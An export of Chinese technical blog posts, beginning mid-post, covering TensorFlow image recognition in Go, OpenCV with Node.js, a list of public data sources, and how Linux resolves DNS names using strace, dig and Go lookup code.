哪种类型算是中国式标准美女？ 其实以上三种场景本质上都是图像识别，可以概括为一种基于外观的分类（或者说“打分”）需求，接下来我试图基于机器学习的方法来解决这些问题。 Demo: Hello TensorFlow ! Tensorflow is not a Machine Learning specific library, instead, is a general purpose computation library that represents computations with graphs. TensorFlow 开源软件库（Apache 2.0 许可证），最初由 Google Brain 团队开发。TensorFlow 提供了一系列算法模型和编程接口，让我们可以快速构建一个基于机器学习的智能服务。对于开发者来说，目前有四种编程接口可供选择： C++ source code: Tensorflow 核心基于 C++ 编写，支持从高到低各个层级的操作; Python bindings &amp; Python library: 对标 C++ 实现，支持 Python 调用 C++ 函数; Java bindings; Go binding; 下面是一个简单的实例： 环境准备 安装 TensorFlow C library,包含一个头文件 c_api.h 和 libtensorflow.so 123456789101112wget https://storage.googleapis.com/tensorflow/libtensorflow/libtensorflow-cpu-linux-x86_64-1.5.0.tar.gz## options# Change to "gpu" for GPU supportTF_TYPE="cpu"TF_VERSION='1.5.0'curl -L \ "https://storage.googleapis.com/tensorflow/libtensorflow/libtensorflow-$&#123;TF_TYPE&#125;-$(go env GOOS)-x86_64-$&#123;TF_VERSION&#125;.tar.gz" |## 查看 tensorflow 版本$ python -c 'import tensorflow as tf; print(tf.__version__)' # for Python 2$ python3 -c 'import tensorflow as tf; print(tf.__version__)' # for Python 3 安装 Go 语言环境,参考：玩转编程语言：Golang 安装 Tensorflow Go binding library 12go get github.com/tensorflow/tensorflow/tensorflow/gogo get github.com/tensorflow/tensorflow/tensorflow/go/op 下载模型（demo model)，包含一个标签文件 label_strings.txt 和 graph.pb 1234mkdir modelwget https://storage.googleapis.com/download.tensorflow.org/models/inception5h.zip -O model/inception.zipunzip model/inception.zip -d modelchmod -R 777 model Tensorflow Model Function123456789101112131415161718192021222324252627//Loading TensorFlow modelfunc loadModel() error &#123; // Load inception model model, err := ioutil.ReadFile("./model/tensorflow_inception_graph.pb") if err != nil &#123; return err &#125; graph = tf.NewGraph() if err := graph.Import(model, ""); err != nil &#123; return err &#125; // Load labels labelsFile, err := os.Open("./model/imagenet_comp_graph_label_strings.txt") if err != nil &#123; return err &#125; defer labelsFile.Close() scanner := bufio.NewScanner(labelsFile) // Labels are separated by newlines for scanner.Scan() &#123; labels = append(labels, scanner.Text()) &#125; if err := scanner.Err(); err != nil &#123; return err &#125; return nil&#125; Classifying Workflow基于 Tensorflow 模型实现图像识别的主要流程如下： 图像转换 (Convert to tensor ) 图像标准化( Normalize ) 图像分类 （ Classifying ) 123456789101112131415161718192021222324func recognizeHandler(w http.ResponseWriter, r *http.Request, _ httprouter.Params) &#123; // Read image imageFile, header, err := r.FormFile("image") // Will contain filename and extension imageName := strings.Split(header.Filename, ".") if err != nil &#123; responseError(w, "Could not read image", http.StatusBadRequest) return &#125; defer imageFile.Close() var imageBuffer bytes.Buffer // Copy image data to a buffer io.Copy(&amp;imageBuffer, imageFile) // ... tensor, err := makeTensorFromImage(&amp;imageBuffer, imageName[:1][0]) if err != nil &#123; responseError(w, "Invalid image", http.StatusBadRequest) return &#125; // ...&#125; 函数 makeTensorFromImage() which runs an image tensor through the normalization graph.1234567891011121314151617181920212223func makeTensorFromImage(imageBuffer *bytes.Buffer, imageFormat string) (*tf.Tensor, error) &#123; tensor, err := tf.NewTensor(imageBuffer.String()) if err != nil &#123; return nil, err &#125; graph, input, output, err := makeTransformImageGraph(imageFormat) if err != nil &#123; return nil, err &#125; session, err := tf.NewSession(graph, nil) if err != nil &#123; return nil, err &#125; defer session.Close() normalized, err := session.Run( map[tf.Output]*tf.Tensor&#123;input: tensor&#125;, []tf.Output&#123;output&#125;, nil) if err != nil &#123; return nil, err &#125; return normalized[0], nil&#125; 函数 maketransformimagegraph() 将图形的像素值调整到 224x224，以符合模型输入参数要求。 12345678910111213141516171819202122232425262728293031func makeTransformImageGraph(imageFormat string) (graph *tf.Graph, input, output tf.Output, err error) &#123; const ( H, W = 224, 224 Mean = float32(117) Scale = float32(1) ) s := op.NewScope() input = op.Placeholder(s, tf.String) // Decode PNG or JPEG var decode tf.Output if imageFormat == "png" &#123; decode = op.DecodePng(s, input, op.DecodePngChannels(3)) &#125; else &#123; decode = op.DecodeJpeg(s, input, op.DecodeJpegChannels(3)) &#125; // Div and Sub perform (value-Mean)/Scale for each pixel output = op.Div(s, op.Sub(s, // Resize to 224x224 with bilinear interpolation op.ResizeBilinear(s, // Create a batch containing a single image op.ExpandDims(s, // Use decoded pixel values op.Cast(s, decode, tf.Float), op.Const(s.SubScope("make_batch"), int32(0))), op.Const(s.SubScope("size"), []int32&#123;H, W&#125;)), op.Const(s.SubScope("mean"), Mean)), op.Const(s.SubScope("scale"), Scale)) graph, err = s.Finalize() return graph, input, output, err&#125; 最后，将格式化的 image tensor 输入到 Inception model graph 中运算。 1234567891011121314151617session, err := tf.NewSession(graph, nil)if err != nil &#123; log.Fatal(err)&#125;defer session.Close()output, err := session.Run( map[tf.Output]*tf.Tensor&#123; graph.Operation("input").Output(0): tensor, &#125;, []tf.Output&#123; graph.Operation("output").Output(0), &#125;, nil)if err != nil &#123; responseError(w, "Could not run inference", http.StatusInternalServerError) return&#125; Testing12345678910111213func main() &#123; if err := loadModel(); err != nil &#123; log.Fatal(err) return &#125; r := httprouter.New() r.POST("/recognize", recognizeHandler) err := http.ListenAndServe(":8080", r) if err != nil &#123; log.Println(err) return &#125;&#125; 12345678910$ curl localhost:8080/recognize -F 'image=@../data/IMG_3560.png'&#123; "filename":"IMG_3000.png", "labels":[ &#123;"label":"black swan","probability":0.98746836,"Percent":"98.75%"&#125;, &#123;"label":"oystercatcher","probability":0.0040768473,"Percent":"0.41%"&#125;, &#123;"label":"American coot","probability":0.002185003,"Percent":"0.22%"&#125;, &#123;"label":"black stork","probability":0.0011524856,"Percent":"0.12%"&#125;, &#123;"label":"redshank","probability":0.0010183558,"Percent":"0.10%"&#125;]&#125; 通过上面的案例我们可以发现，这个服务目前可以对于黑天鹅图像的推算概率值为 98.75%，非常准确；但是对于另外两张宠物狗的图像，最高的推算概率值也仅有 30% 左右，虽然也没有被识别成猫咪或者狼，但是和理想效果要求可用性还有一段距离（此处暂时忽略物种本身的复杂性）。主要是因为现在我们使用的还只是一个非常“原始”的模型，如果需要为小众领域服务（宠物，也可以是其它事物），需要通过训练（Training Models）增强优化，或者引入更丰富的标签，更合适的模型。当然，训练过程中也会存在样本质量不佳的情况，错误样本和各种噪音也会影响准确度。 TipsHow to Install TensorFlow on CentOS 7123456789101112131415161718192021222324252627# 1. To enable the repository, install the SCL release file:$ sudo yum install centos-release-scl$ sudo yum install rh-python36# 2. Creating a Virtual Environment# To access Python 3.6 you need to launch a new shell instance using the scl tool:$ scl enable rh-python36 bash# Create a new directory for the TensorFlow project and cd into it:$ mkdir tensorflow_project$ cd tensorflow_project$ python3 -m venv venv$ source venv/bin/activate# Upgrade pip to the latest version to avoid issues when installing packages:$ pip install --upgrade pip# 3. Installing TensorFlow$ pip install --upgrade tensorflow# 4. To verify the installation$ python -c 'import tensorflow as tf; print(tf.__version__)'At the time of writing this article, the latest stable version of TensorFlow is 1.13.1# 5. Once you are done with your work, deactivate the environment, by typing deactivate and you will return to your normal shell.$ deactivate Lessons Deep Learning With TensorFlow 2.0 Google 制作的节奏紧凑、内容实用的机器学习简介课程 | 使用 TensorFlow API 扩展阅读 How to Retrain Inception’s Final Layer for New Categories Getting Started with TensorFlow: A Machine Learning Tutorial YoutubeIntroduction To TensorFlow We Need to Go Deeper: A Practical Guide to Tensorflow and Inception Tensorflow.org: Image Recognition We know that label 866 (military uniform) should be the top label for the Admiral Hopper image. 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 How to Install TensorFlow on CentOS 7 GoLearn Understanding Tensorflow using Go Using your tensorflow model with go Build an Image Recognition API with Go and TensorFlow 以源码方式在Linux安装TensorFlow记录 TensorFlow系统架构及高性能程序设计 Yahoo开源TensorFlowOnSpark TensorFlow和Caffe、MXNet、Keras等其他深度学习框架的对比 TensorFlow、MXNet、PaddlePaddle三个开源库对比]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js]]></title>
    <url>%2F2018%2F01%2F15%2FMachine-Learning-OpenCV%2F</url>
    <content type="text"><![CDATA[摘要 计算机视觉库：OpenCV Using OpenCV with Node.js PriviousOpenCV ( Open Source Computer Vision Library )，是一个基于C/C++语言的计算机视觉库，在跨平台图像/视频处理、模式识别、人机交互、机器人等领域有广泛的应用。 OpenCV 包含机器学习库，支持传统的机器学习算法（决策树、朴素贝叶斯、支持向量机、随机森林等），近期的版本演进侧重于增强深度学习的支持，例如 OpenCV 3.3 将深度神经网络（Deep neural networks，DNN ) 提升到主代码库（promote DNN module from opencv_contrib to the main repository），2017 年 12 月发布的 OpenCV 3.4 针对 R-CNN 进行了性能优化。 OpenCV 的主要编程是 C++ ，大部分的接口也是基于 C++，但它仍然保留着很多 C 接口（功能不完整）。绑定语言（binding）有 Python，java 和 MATLAB /OCTAVE ，另外还有一些其他语言的包装器（wrapper）如 C# , Perl , Haskell 和 Ruby。opencv4nodejs 项目是一个支持所有 OpenCV 3 的 Node.js 绑定，有助于弥补 JavaScript 缺乏计算机视觉实现的不足，为 Node.js 优势应用场景的选型中提供了更多选择（例如使用 WebSocket 推送技术创建实时 Web 应用）。 前文回顾：Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 中演示了一个图像识别的案例，我们来看看基于 OpenCV + Node.js 是如何实现的： Using OpenCV with Node.js Enviroment12345678910111213$ cmake --versioncmake version 3.10.2$ brew install cmake$ brew install opencv3# dependencies for opencv: eigen, lame, x264, xvid, ffmpeg, libpng,# libtiff, ilmbase, openexr, gdbm, python, xz, python3, numpy, tbb$ mkdir project-opencv-demo$ cd project-opencv-demo$ npm init$ npm install --save opencv4nodejs Load InceptionModelTensorflow Inception Model 是一个已经被训练好的模型，可以识别数千类对象，只要将图像输入就可以输出推测的一个分类概率。Tensorflow Inception Model 包括 ‘graph.pb’ 和 ‘label_strings.txt’ 两个文件，使用之前需要先加载。 1234567891011121314151617181920212223242526const cv = require('opencv4nodejs');//const cv = require('../');const fs = require('fs');const path = require('path');if (!cv.xmodules.dnn) &#123; throw new Error('exiting: opencv4nodejs compiled without dnn module');&#125;// replace with path where you unzipped inception modelconst inceptionModelPath = './models/tf-inception'const modelFile = path.resolve(inceptionModelPath, 'tensorflow_inception_graph.pb');const classNamesFile = path.resolve(inceptionModelPath, 'imagenet_comp_graph_label_strings.txt');if (!fs.existsSync(modelFile) || !fs.existsSync(classNamesFile)) &#123; console.log('exiting: could not find inception model'); console.log('download the model from: https://storage.googleapis.com/download.tensorflow.org/models/inception5h.zip'); return;&#125;console.log('load models:'+inceptionModelPath)// read classNames and store them in an arrayconst classNames = fs.readFileSync(classNamesFile).toString().split("\n");// initialize tensorflow inception model from modelFileconst net = cv.readNetFromTensorflow(modelFile); Image Classify读取图片存储为 Blob 格式，调用 net.forward() （图像作为输入参数），此处我们仅输出概率高于 5% 的分类。 1234567891011121314151617181920212223242526272829303132333435const classifyImg = (img) =&gt; &#123; // inception model works with 224 x 224 images, so we resize // our input images and pad the image with white pixels to // make the images have the same width and height const maxImgDim = 224; const white = new cv.Vec(255, 255, 255); const imgResized = img.resizeToMax(maxImgDim).padToSquare(white); // network accepts blobs as input const inputBlob = cv.blobFromImage(imgResized); net.setInput(inputBlob); // forward pass input through entire network, will return // classification result as 1xN Mat with confidences of each class const outputBlob = net.forward(); // find all labels with a minimum confidence const minConfidence = 0.05; const locations = outputBlob .threshold(minConfidence, 1, cv.THRESH_BINARY) .convertTo(cv.CV_8U) .findNonZero(); const result = locations.map(pt =&gt; (&#123; confidence: parseInt(outputBlob.at(0, pt.x) * 100) / 100, className: classNames[pt.x] &#125;)) // sort result by confidence .sort((r0, r1) =&gt; r1.confidence - r0.confidence) .map(res =&gt; `$&#123;res.className&#125; ($&#123;res.confidence&#125;)`); return result;&#125; Test12345678910111213141516171819202122const testData = [ &#123; image: './data/IMG_3560.png', label: 'Yan Dog' &#125;, &#123; image: './data/IMG_3608.png', label: 'Yang Dog' &#125;];testData.forEach((data) =&gt; &#123; const img = cv.imread(data.image); console.log('%s,%s: ', data.image,data.label); const predictions = classifyImg(img); predictions.forEach(p =&gt; console.log(p)); //cv.imshowWait('img', img); console.log("---------finish---------");&#125;); 123456789101112131415161718192021$ npm run tf-classify&gt; node ./tf-classify.jsload models:./models/tf-inception-------------------------------./data/IMG_3560.png,Yan Dog:[ INFO:0] Initialize OpenCL runtime...潘布魯克威尔斯柯基犬 Pembroke (0.83)-------------------------------./data/IMG_4423.png,Yang Dog:吉娃娃 Chihuahua (0.89)Pembroke (0.07)-------------------------------./data/IMG_3608.png,Yang Dog:玩具梗 toy terrier (0.22)美国斯塔福德郡梗 American Staffordshire terrier (0.2)吉娃娃 Chihuahua (0.14)斯塔福德郡牛头梗 Staffordshire bullterrier (0.12)比特犬 whippet (0.05)------------------------------- 问题：对比之前 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 的预测值，两次识别的结果很接近，但是又有不同，这是为什么呢？请注意后续更新。 OpenCV 概要OpenCV ( Open Source Computer Vision Library )，是一个基于C/C++语言的跨平台图像/视频处理函数库。OpenCV 由英特尔公司于1999年发起并参与开发，以 BSD 许可证授权发行，可以在商业和研究领域中免费使用。OpenCV 主要用于开发实时的图像处理、计算机视觉以及模式识别程序。 OpenCV 的主要编程是 C++ ，大部分的接口也是基于 C++，但它仍然保留着很多 C 接口（不完整）。绑定语言（binding）有 Python，java 和 MATLAB /OCTAVE ，另外还有一些其他语言的包装器（wrapper）如 C# , Perl , Haskell 和 Ruby。 OpenCV 版本OpenCV 第一个预览版本于 2000 年在 IEEE Conference 公开，目前每6个月就会有一个官方版本，由一个商业公司赞助的独立小组开发。OpenCV 1.0：2006年发布OpenCV 2.0：2009年10月发布，主要更新包括 C++ 接口OpenCV 2.3：2011年6月发布，主要更新包括移动终端兼容性（NDK-Build）OpenCV 3.0：2015年6月发布OpenCV 3.3: 2017年8月发布，主要更新包括深度学习（promote DNN module from opencv_contrib to the main repository）OpenCV 3.4: 2017年12月发布，主要更新包括 DNN 模块改进（包括 R-CNN 性能优化), Javascript 绑定和 OpenCL 实现 123#查看版本$ pkg-config --modversion opencv3.4.0 OpenCV 主要模块 cv 核心函数库 cvaux 辅助函数库 cxcore 数据结构与线性代数库 highgui GUI 函数库，包括用户界面、读/写图像及视频 ml 机器学习函数库，包括统计模型、贝叶斯、最近邻居、支持向量机、决策树、随机树、最大期望、神经网络等，详见Machine Learning:机器学习算法。 gpu GPU加速,GPU模块及数据结构，包含图像处理与分析模块 OpenCV 主要功能 图像数据操作（内存分配与释放 allocation &amp; release，图像复制 copying、设定和转换 setting &amp; conversion） 矩阵/向量数据操作及线性代数运算（矩阵乘积、矩阵方程求解、特征值、奇异值分解） 支持多种动态数据结构（链表、队列、数据集、树、图） 基本图像处理（去噪、边缘检测、角点检测、采样与插值、色彩变换、形态学处理、直方图、图像金字塔结构） 结构分析（连通域/分支、轮廓处理、距离转换、图像矩、模板匹配、霍夫变换、多项式逼近、曲线拟合、椭圆拟合、狄劳尼三角化） 图像/视频的输入输出（支持文件或摄像头的输入，图像/视频文件的输出） 摄像头定标（寻找和跟踪定标模式、参数定标、基本矩阵估计、单应矩阵估计、立体视觉匹配） 运动分析（光流 optical flow、动作分割 motion segmentation、目标跟踪 tracking） OpenCV 基本数据类型 CvPoint:表示一个坐标为整数的二维点 CvSize:表示矩阵框大小，以像素为精度。 CvRect:通过方形左上角坐标和方形的高和宽来确定一个矩形区域 CvScalar:用来存放像素值（ double 数组，不一定是灰度值） 123456789101112131415161718192021222324typedef struct CvPoint&#123; int x;//图像中点的x坐标 int y;//图像中点的y坐标&#125;typedef struct CvSize&#123; int width; //矩形宽 int height; //矩形高&#125;typedef struct CvRect &#123; int x; //方形的左上角的x-坐标 int y; //方形的左上角的y-坐标 int width; //宽 int height; //高&#125; typedef struct CvScalar&#123; double val[4];&#125; OpenCV 与机器学习OpenCV 包含机器学习库，支持以下算法： Boosting Decision tree learning Gradient boosting trees Expectation-maximization algorithm k-nearest neighbor algorithm Naive Bayes classifier Artificial neural networks Random forest Support vector machine (SVM) Deep neural networks (DNN) （OpenCV 3.3 promote DNN module from opencv_contrib to the main repository） OpenCV 资源 OpenCV github repo Using OpenCV with Node.js opencv4nodejs OpenCV编程简介 Introduction to programming with OpenCV 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 The 5 Computer Vision Techniques That Will Change How You See The World Paper Rethinking the Inception Architecture for Computer Vision Node.js meets OpenCV’s Deep Neural Networks — Fun with Tensorflow and Caffe Build an Image Recognition API with Go and TensorFlow Train your own image classifier with Inception in TensorFlow | Wednesday, March 09, 2016 | Google Research Blog Node.js + OpenCV for Face Recognition Node.js + face-recognition.js : Simple and Robust Face Recognition using Deep Learning Node.js meets OpenCV’s Deep Neural Networks — Fun with Tensorflow and Caffe Machine Learning is Fun! Part 4: Modern Face Recognition with Deep Learning Machine Learning with OpenCV and JavaScript: Recognizing Handwritten Letters using HOG and SVM Live Face Detection in Go using OpenCV and MachineBox | video 雅虎开源色情图片检测神经网络]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
        <tag>Nodejs</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（十）公共数据源列表]]></title>
    <url>%2F2018%2F01%2F15%2FVisualization-DataSource%2F</url>
    <content type="text"><![CDATA[摘要 优质公开数据源列表 技术支持：爬虫、数据分析与可视化 一、数据源教学数据 (教学数据) Stanford Large Network Dataset Collection 公共数据 经济学人·智库EIU 世界银行·公开数据 世界银行数据清洗器 FSI（Freeman Spogli Institute for International Studies at Stanford) 上海市统计局 中国疾病控制中心：每月疫情通报 中国工业和信息化部：电话用户分省情况 中国财政部：彩票销售 中国科学院：院士名单 教育部2017年全国入园儿童1922.09万人，比上年减少86.76万人。在园儿童（包括附设班）4413.86万人，比上年增加149.03万人。幼儿园园长和教师共249.88万人，比上年增加19.56万。 重大工程案例研究和数据中心 | 同济大学 Nature WTO:Global Health Observatory (GHO) data 美国国家生物技术信息中心 美国农业部·食品成分数据库 | USDA Food Composition Databases 美国交通部·公开数据库 二、技术支持数据可视化（五）基于网络爬虫制作可视化图表 图表数据可视化技术方案 基于网络爬虫的可视化图表 数据可视化（八）Program,Data and Classical Music 基于 Go + R 可视化古典音乐作曲家社交网络 Coperformance 是一个业余项目，编程分析纽约爱乐乐团演出历史数据库。 三、案例 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 案例：世界主要国家专利申请变化情况（欧洲专利局） 在线演示 参考文献]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How Linux Works:Network]]></title>
    <url>%2F2018%2F01%2F08%2FLinux-Works-Network%2F</url>
    <content type="text"><![CDATA[摘要 一、How DNS Works 二、How Route Works 三、How ARP Works How DNS Works 域名系统（Domain Name System，DNS）将域名和 IP 地址相互映射，能够使人更方便地访问互联网。DNS 最早于 1983 年由保罗·莫卡派乔斯（Paul Mockapetris）发明（RFC 882，RFC 883），1987年发布了修正（RFC 1034，RFC 1035），在此之后 DNS 技术基本上没有改动。 DNS 协议使用端口 53 ，同时兼容 TCP (RFC-793) 和 UDP(RFC-768) ，但是考虑到更低的开销及性能，DNS 查询通常使用 UDP 协议。DNS 消息包括请求和响应两部分, 所有报文包含标题和其他片断 (例如 question 和 RR ，取决于报文类型)。 DNS Message - Header: 给出语义的上下文，包括查询个数、结果个数、 会话 ID 等 DNS Message - Question: 包含要针对 nameserver 执行的查询 DNS Message - RR: 包装格式相同, 可以根据类型分析字段 (RDATA) The DNS assumes that messages will be transmitted as datagrams or in a byte stream carried by a virtual circuit. While virtual circuits can be used for any DNS activity, datagrams are preferred for queries due to their lower overhead and better performance. — 《RFC-1035 DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION》 123456$ping baidu.com | head -1PING baidu.com (220.181.57.216) 56(84) bytes of data.$host baidu.combaidu.com has address 220.181.57.216baidu.com has address 123.125.115.110 unknown hoststrace 是 Linux 环境下的一款程序调试工具，用来监视一个应用程序所使用的系统调用及它所接收的系统信息。借助 strace 我们可以更好地理解 DNS 工作原理。 123456789101112131415161718192021$ping baidu.comping: unknown host baidu.com# strace -e trace=open -f ping -c1 baidu.comopen("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libcap.so.2", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libidn.so.11", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libattr.so.1", O_RDONLY|O_CLOEXEC) = 3open("/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3open("/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libnss_files.so.2", O_RDONLY|O_CLOEXEC) = 4open("/etc/host.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 4open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libnss_dns.so.2", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 4ping: unknown host baidu.com+++ exited with 2 +++ hosts - static table lookup for hostnames/etc/hosts 主机名查询静态表；主要用于IP地址与计算机主机名之间的转换。与 /etc/resolv.conf 的区别是，用户可以直接对 hosts 文件进行控制。一般情况下，我们主要通过 DNS 自动提供动态的主机名解析。不过 hosts 文件仍然是一个可以作为备用手段。 【IPv4】 127.0.0.1 localhost 【FQDN】 192.168.1.10 foo.mydomain.org foo 【FQDN】 209.237.226.90 www.opensource.org 【IPv6】 ::1 localhost ip6-localhost ip6-loopback 【IPv6】 ff02::1 ip6-allnodes 【IPv6】 ff02::2 ip6-allrouters /etc/resolv.conf/etc/resolv.conf DNS 客户机配置文件，用于设置 DNS 服务器的 IP 地址及 DNS 域名，还包含了主机的域名搜索顺序。 值得注意的是，许多程序能够覆盖 /etc/resolv.conf 里的内容（例如 dhcpcd, NetworkManager ），但是有些时候我们希望能够手动设定 DNS 设置(比如使用静态IP时)，可以参考以下几种方法： 修改 dhcpcd 配置，echo “nohook resolv.conf” &gt; /etc/dhcpcd.conf 创建 resolv.conf.head ，dhcpcd将把这个文件插入到 /etc/resolv.conf 文件头. 写保护 /etc/resolv.conf，chattr +i /etc/resolv.conf 12# vi /etc/resolv.confnameserver 1.1.1.1 1234567891011121314151617181920212223# strace -e trace=open -f ping -c1 baidu.comopen("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libcap.so.2", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libidn.so.11", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3open("/lib64/libattr.so.1", O_RDONLY|O_CLOEXEC) = 3open("/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3open("/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libnss_files.so.2", O_RDONLY|O_CLOEXEC) = 4open("/etc/host.conf", O_RDONLY|O_CLOEXEC) = 4open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 4open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libnss_dns.so.2", O_RDONLY|O_CLOEXEC) = 4open("/lib64/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 4PING baidu.com (220.181.57.216) 56(84) bytes of data.open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 464 bytes from 220.181.57.216: icmp_seq=1 ttl=128 time=174 ms--- baidu.com ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 174.062/174.062/174.062/0.000 ms+++ exited with 0 +++ NSSwitchnsswitch.conf（name services switch）是 SUN 公司开发的一种扩展。每一行都标识特定类型的网络信息（如主机、口令和组）以及信息源（如 NIS+ 表、NIS 映射、DNS 主机表或本地 /etc）。 NSSwitch is not just for DNS lookups. It’s also used for passwords and user lookup information. 12345678910111213141516# more /etc/nsswitch.confpasswd: files sssshadow: files sssgroup: files ssshosts: files dnsbootparams: nisplus [NOTFOUND=return] filesethers: filesnetmasks: filesnetworks: filesprotocols: filesrpc: filesservices: files sssnetgroup: files ssspublickey: nisplusautomount: files sssaliases: files nisplus dig | Domain Information Groperdig（Domain Information Groper，域信息搜索器）命令是一个用于查询 DNS 的工具。dig 总共有42个查询选项，涉及到 DNS 信息的方方面面，在 DNS 问题诊断时可以将整个过程信息输出。 1234dig +nocmd google.com 输出过滤版本信息dig +short google.com 输出最精简的CNAME信息和A记录dig +nostat google.com 输出过滤统计信息dig +trace google.com 输出跟踪，从根域查询直到最终结果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# dig +short google.com74.125.130.10274.125.130.13974.125.130.13874.125.130.10074.125.130.10174.125.130.113# dig +trace google.comDiG 9.9.4-RedHat-9.9.4-18.el7 +trace google.com;; global options: +cmd. 5 IN NS a.root-servers.net.. 5 IN NS b.root-servers.net.. 5 IN NS c.root-servers.net.. 5 IN NS d.root-servers.net.. 5 IN NS e.root-servers.net.. 5 IN NS f.root-servers.net.. 5 IN NS g.root-servers.net.. 5 IN NS h.root-servers.net.. 5 IN NS i.root-servers.net.. 5 IN NS j.root-servers.net.. 5 IN NS k.root-servers.net.. 5 IN NS l.root-servers.net.. 5 IN NS m.root-servers.net.. 5 IN RRSIG NS 8 0 518400 20180803170000 20180721160000 41656 ......;; Received 717 bytes from 192.168.213.2#53(192.168.213.2) in 10120 mscom. 172800 IN NS g.gtld-servers.net.com. 172800 IN NS j.gtld-servers.net.com. 172800 IN NS f.gtld-servers.net.com. 172800 IN NS h.gtld-servers.net.com. 172800 IN NS b.gtld-servers.net.com. 172800 IN NS d.gtld-servers.net.com. 172800 IN NS i.gtld-servers.net.com. 172800 IN NS m.gtld-servers.net.com. 172800 IN NS a.gtld-servers.net.com. 172800 IN NS l.gtld-servers.net.com. 172800 IN NS c.gtld-servers.net.com. 172800 IN NS k.gtld-servers.net.com. 172800 IN NS e.gtld-servers.net.com. 86400 IN DS 30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766com. 86400 IN RRSIG DS 8 1 86400 20180804050000 20180722040000 41656 ......;; Received 1170 bytes from 192.36.148.17#53(i.root-servers.net) in 10405 msgoogle.com. 172800 IN NS ns2.google.com.google.com. 172800 IN NS ns1.google.com.google.com. 172800 IN NS ns3.google.com.google.com. 172800 IN NS ns4.google.com......;; Received 772 bytes from 192.26.92.30#53(c.gtld-servers.net) in 4914 msgoogle.com. 300 IN A 172.217.31.238;; Received 44 bytes from 216.239.36.10#53(ns3.google.com) in 1003 ms DNS Coding API1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( "fmt" "net")func main() &#123; query("riboseyim.com") query("qq.com") query("facebook.com") host := "riboseyim-qiniu.riboseyim.com" cname, _ := net.LookupCNAME(host) fmt.Println("CNAME(域名),host", host, "cname", cname) server_ip := "8.8.8.8" ptr, _ := net.LookupAddr(server_ip) for _, ptrvalue := range ptr &#123; fmt.Println("PTR(指针，IP地址的别名),server_ip", server_ip, "ptrvalue", ptrvalue) &#125;&#125;func query(domain string) &#123; iprecords, _ := net.LookupIP(domain) for _, ip := range iprecords &#123; fmt.Println("A(主机地址),domain", domain, "ip", ip) &#125; nameserver, _ := net.LookupNS(domain) for _, ns := range nameserver &#123; fmt.Println("NS(域名服务器),domain", domain, "nameserver", ns) &#125; mxrecords, _ := net.LookupMX(domain) for _, mx := range mxrecords &#123; fmt.Println("MX(邮件交换),domain", domain, "mx.host", mx.Host, "mx.pref", mx.Pref) &#125; txtrecords, _ := net.LookupTXT(domain) for _, txt := range txtrecords &#123; fmt.Println("TXT(文本标识),domain", domain, "txt", txt) &#125;&#125; 案例 重点案例：ARP 与网关欺骗攻击 hyperfox:HTTP/HTTPs MITM proxy 